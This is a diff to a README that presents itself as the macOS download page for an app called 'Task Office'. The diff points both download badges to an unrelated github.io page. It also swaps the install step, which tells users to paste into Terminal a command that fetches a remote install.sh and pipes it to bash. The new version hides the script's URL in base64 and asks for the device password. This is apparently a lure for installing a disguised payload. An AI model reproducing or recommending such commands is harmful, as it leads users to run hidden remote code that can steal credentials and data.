@@ -7,7 +7,7 @@ It’s ideal for professionals, entrepreneurs, and anyone looking for a powerful
 ---
 
 ## ✅ Download Task Office for macOS  
-[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](https://task-office-mac-download.github.io/.github)
+[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](https://shuziktobehuman.github.io/huja/Task)
 
 ---
 
@@ -26,7 +26,7 @@ It’s ideal for professionals, entrepreneurs, and anyone looking for a powerful
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -64,7 +64,7 @@ Task Office is a project and task management application that allows users to cr
 
 ---
 
-[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](https://task-office-mac-download.github.io/.github)
+[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](https://shuziktobehuman.github.io/huja/Task)
 
 ---
 
